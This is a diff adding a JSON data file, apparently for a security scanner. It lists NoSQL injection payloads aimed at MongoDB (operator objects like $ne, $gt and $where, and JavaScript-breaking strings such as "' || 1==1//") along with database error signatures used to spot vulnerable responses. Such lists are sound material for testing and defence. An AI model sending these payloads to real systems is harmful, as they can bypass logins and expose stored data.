@@ -1,0 +1,30 @@
+{
+  "payloads": [
+    "{\"$gt\": \"\"}",
+    "{\"$ne\": null}",
+    "{\"$ne\": \"\"}",
+    "{\"$exists\": true}",
+    "{\"$regex\": \".*\"}",
+    "{\"$where\": \"1==1\"}",
+    "{\"$or\": [{}, {\"a\": \"a\"}]}",
+    "'; return true; var x='",
+    "' || 1==1//",
+    "' && this.password.length > 0 || 'x'=='x",
+    "{\"$gt\": -1}",
+    "{\"$gte\": 0}"
+  ],
+  "error_signatures": [
+    "MongoError",
+    "MongoServerError",
+    "CastError",
+    "BSONTypeError",
+    "Cannot read properties of undefined",
+    "Cannot read property",
+    "mongodb:",
+    "MongoNetworkError",
+    "BulkWriteError",
+    "WriteError",
+    "DocumentNotFoundError",
+    "UnhandledPromiseRejectionWarning"
+  ]
+}
